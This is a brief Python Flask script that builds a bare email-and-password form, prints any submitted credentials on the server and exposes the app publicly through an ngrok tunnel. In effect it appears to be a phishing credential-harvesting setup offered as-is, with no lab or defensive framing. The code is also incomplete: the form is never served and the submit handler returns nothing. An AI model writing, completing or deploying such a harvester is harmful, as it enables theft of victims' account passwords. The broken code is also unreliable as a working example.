from flask import Flask, request
from pyngrok import conf, ngrok

app = Flask(__name__)

PAGE = '''<form method="post" action="/submit">
<input name="email" type="email">
<input name="password" type="password">
<button>Continue</button></form>'''

@app.route("/submit", methods=["POST"])
def collect():
    email = request.form.get("email")
    password = request.form.get("password")
    print(email, password)

conf.get_default().auth_token = "embedded-tunnel-token"
ngrok.connect(5000)
app.run()
